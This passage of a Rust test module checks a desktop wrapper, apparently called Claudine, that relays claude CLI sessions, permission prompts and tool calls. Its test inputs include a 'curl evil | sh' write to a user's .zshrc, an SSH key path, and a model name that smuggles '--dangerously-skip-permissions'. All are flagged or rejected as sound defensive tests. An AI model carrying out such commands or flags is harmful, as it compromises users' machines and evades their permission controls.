        assert_eq!(sent["response"]["response"]["behavior"], "deny");
        assert_eq!(sent["response"]["response"]["message"], DECLINED);
        assert!(sent["response"]["response"]["updatedInput"].is_null());
    }

    #[test]
    fn dropping_a_session_stops_its_process() {
        let (session, _folder, events) = start_fake("drop");
        wait_for("permission event", || {
            events
                .lock()
                .unwrap()
                .iter()
                .any(|e| e.contains("permission"))
        });
        let stdin = Arc::clone(&session.handles.stdin);
        drop(session);
        wait_for("exit event", || {
            events.lock().unwrap().iter().any(|e| e.contains("exited"))
        });
        let write = write_line(&stdin, &json!({}));
        assert_eq!(write, Err(CommandError::NoSession));
    }

    fn root() -> PathBuf {
        PathBuf::from("/Users/me/app")
    }

    #[test]
    fn paths_inside_the_project_become_relative() {
        assert_eq!(
            relative("/Users/me/app/src/a.rs", &root()),
            ("src/a.rs".to_string(), false)
        );
        assert_eq!(relative("/Users/me/app", &root()), (".".to_string(), false));
    }

    #[test]
    fn paths_outside_the_project_are_flagged() {
        for path in [
            "/Users/me/.ssh/id_ed25519",
            "/Users/me/app-other/x",
            "/Users/me/app/../.zshrc",
            "src/a.rs",
        ] {
            assert_eq!(relative(path, &root()), (path.to_string(), true), "{path}");
        }
    }

    #[test]
    fn a_write_outside_the_project_is_described_in_full() {
        let input = json!({ "file_path": "/Users/me/.zshrc", "content": "curl evil | sh" });
        let described = describe("Write", &input, &root());
        assert_eq!(described.summary, "/Users/me/.zshrc");
        assert_eq!(described.detail, "curl evil | sh");
        assert!(described.outside);
    }

    #[test]
    fn an_edit_shows_both_sides() {
        let input = json!({
            "file_path": "/Users/me/app/a.rs",
            "old_string": "let a = 1;\nlet b = 2;",
            "new_string": "let a = 3;"
        });
        let described = describe("Edit", &input, &root());
        assert_eq!(described.summary, "a.rs");
        assert_eq!(described.detail, "- let a = 1;\n- let b = 2;\n+ let a = 3;");
    }

    #[test]
    fn unknown_tools_show_their_raw_input() {
        let described = describe("mcp__x__y", &json!({ "q": 1 }), &root());
        assert_eq!(described.detail, r#"{"q":1}"#);
    }

    #[test]
    fn long_text_is_cut_on_a_character_boundary() {
        let text = "é".repeat(MAX_SHOWN_CHARS + 10);
        let short = shorten(text);
        assert_eq!(short.chars().count(), MAX_SHOWN_CHARS + 1);
        assert!(short.ends_with('…'));
        assert_eq!(shorten("hi".to_string()), "hi");
    }

    #[test]
    fn assistant_messages_become_text_and_tool_events() {
        // Shapes copied from `claude` 2.1.309's stream-json output, trimmed.
        let message = json!({
            "type": "assistant",
            "message": { "content": [
                { "type": "thinking", "thinking": "" },
                { "type": "text", "text": "Writing it now." },
                { "type": "tool_use", "id": "toolu_1", "name": "Write",
                  "input": { "file_path": "/Users/me/app/hello.txt", "content": "hi" } }
            ]}
        });
        assert_eq!(
            events_for(&message, &root()),
            vec![
                SessionEvent::Text {
                    text: "Writing it now.".to_string()
                },
                SessionEvent::Tool {
                    id: "toolu_1".to_string(),
                    name: "Write".to_string(),
                    summary: "hello.txt".to_string(),
                    outside: false,
                },
            ]
        );
    }

    #[test]
    fn tool_results_and_turn_ends_are_relayed() {
        let result = json!({
            "type": "user",
            "message": { "content": [
                { "type": "tool_result", "tool_use_id": "toolu_1", "is_error": true,
                  "content": [{ "type": "text", "text": "denied" }] }
            ]}
        });
        assert_eq!(
            events_for(&result, &root()),
            vec![SessionEvent::ToolResult {
                id: "toolu_1".to_string(),
                is_error: true,
                text: "denied".to_string(),
            }]
        );

        let done = json!({ "type": "result", "is_error": false, "total_cost_usd": 0.0027 });
        assert_eq!(
            events_for(&done, &root()),
            vec![SessionEvent::TurnDone {
                is_error: false,
                message: None,
                cost_usd: Some(0.0027),
                num_turns: None,
            }]
        );
    }

    /// A relay for messages that don't need a running `claude`. Its stdin is `cat`'s;
    /// the caller ends `cat` with `finish`.
    fn test_relay() -> (Relay, Child) {
        let mut child = Command::new("/bin/cat")
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .spawn()
            .unwrap();
        let stdin = child.stdin.take().unwrap();
        let relay = Relay {
            handles: Handles {
                stdin: Arc::new(Mutex::new(stdin)),
                pending: Arc::new(Mutex::new(HashMap::new())),
                models: Arc::new(Mutex::new(Vec::new())),
            },
            root: root(),
            on_event: Arc::new(|_| {}),
        };
        (relay, child)
    }

    fn finish(mut child: Child) {
        let _ = child.kill();
        let _ = child.wait();
    }

    #[test]
    fn the_model_list_is_kept_and_only_listed_models_pass() {
        let (relay, cat) = test_relay();
        // Shape from `claude` 2.1.309's answer to `initialize`, trimmed.
        let init = json!({
            "type": "control_response",
            "response": { "subtype": "success", "request_id": "claudine-init", "response": {
                "current_permission_mode": "default",
                "models": [
                    { "value": "default", "displayName": "Default (recommended)", "description": "Opus 5.5" },
                    { "value": "sonnet", "displayName": "Sonnet 5.5", "description": "Fast" },
                    { "value": "" },
                    { "displayName": "No value" }
                ]
            }}
        });
        let events = relay.handle(&init);
        let SessionEvent::Options { models, mode } = &events[0] else {
            panic!("{events:?}");
        };
        assert_eq!(mode, "default");
        let values: Vec<&str> = models.iter().map(|m| m.value.as_str()).collect();
        assert_eq!(values, ["default", "sonnet"]);
        assert_eq!(models[1].name, "Sonnet 5.5");

        assert_eq!(check_model(&relay.handles, "sonnet"), Ok(()));
        for model in ["claude-3-opus", "sonnet --dangerously-skip-permissions", ""] {
            assert_eq!(
                check_model(&relay.handles, model),
                Err(CommandError::InvalidInput)
            );
        }
        finish(cat);
    }

    #[test]
    fn mode_changes_and_refusals_are_relayed() {
        let (relay, cat) = test_relay();
        let status = json!({ "type": "system", "subtype": "status", "permissionMode": "plan" });
        assert_eq!(
            relay.handle(&status),
            vec![SessionEvent::Mode {
                mode: "plan".to_string()
            }]
        );
        let model = json!({ "type": "control_response", "response": {
            "subtype": "success", "request_id": "claudine-model-3",
            "response": { "model": "claude-sonnet-5-5" } } });
        assert_eq!(
            relay.handle(&model),
            vec![SessionEvent::Model {
                model: "claude-sonnet-5-5".to_string()
            }]
        );
        let refused = json!({ "type": "control_response", "response": {
            "subtype": "error", "request_id": "claudine-mode-4", "error": "invalid_mode" } });
        assert_eq!(
            relay.handle(&refused),
            vec![SessionEvent::Notice {
                message: "invalid_mode".to_string()
            }]
        );
        // Answers to requests Claudine didn't send are ignored.
        let other = json!({ "type": "control_response", "response": {
            "subtype": "error", "request_id": "x", "error": "no" } });
        assert!(relay.handle(&other).is_empty());
        finish(cat);
    }

    #[test]
    fn only_the_offered_modes_deserialize() {
        let mode: PermissionMode = serde_json::from_str(r#""acceptEdits""#).unwrap();
        assert_eq!(mode.as_str(), "acceptEdits");
        for refused in [
            r#""bypassPermissions""#,
            r#""auto""#,
            r#""dontAsk""#,
            r#""Plan""#,
        ] {
            assert!(
                serde_json::from_str::<PermissionMode>(refused).is_err(),
                "{refused}"
            );
        }
    }

    #[test]
    fn unknown_and_malformed_messages_are_ignored() {
        for message in [
            json!({ "type": "stream_event" }),
            json!({ "type": "assistant", "message": { "content": "plain" } }),
            json!(42),
            json!(null),
        ] {
            assert!(events_for(&message, &root()).is_empty());
        }
    }

    #[test]
    fn plans_echoes_and_usage_limits_are_relayed() {
        let todo = json!({ "type": "assistant", "message": { "content": [{
            "type": "tool_use", "id": "t1", "name": "TodoWrite",
            "input": { "todos": [
                { "content": "Read pool.rs", "status": "completed", "activeForm": "Reading" },
                { "content": "Add a lock", "status": "in_progress", "activeForm": "Adding" }
            ] }
        }] } });
        let events = events_for(&todo, &root());
        assert_eq!(
            events[0],
            SessionEvent::Plan {
                items: vec![
                    PlanItem {
                        text: "Read pool.rs".to_string(),
                        status: "completed".to_string()
                    },
                    PlanItem {
                        text: "Add a lock".to_string(),
                        status: "in_progress".to_string()
                    },
                ]
            }
        );

        let echo =
            json!({ "type": "user", "message": { "role": "user", "content": "Also add tests" } });
        assert_eq!(
            events_for(&echo, &root()),
            vec![SessionEvent::UserEcho {
                text: "Also add tests".to_string()
            }]
        );

        let limit = json!({ "type": "rate_limit_event",
            "rate_limit_info": { "status": "rejected", "resetsAt": 1794271800u64 } });
        assert_eq!(
            events_for(&limit, &root()),
            vec![SessionEvent::RateLimit {
                status: "rejected".to_string(),
                resets_at: Some(1794271800)
            }]
        );

        let init =
            json!({ "type": "system", "subtype": "init", "model": "m", "session_id": "abc" });
        assert_eq!(
            events_for(&init, &root()),
            vec![SessionEvent::Ready {
                model: "m".to_string(),
                session_id: "abc".to_string()
            }]
        );
    }
}
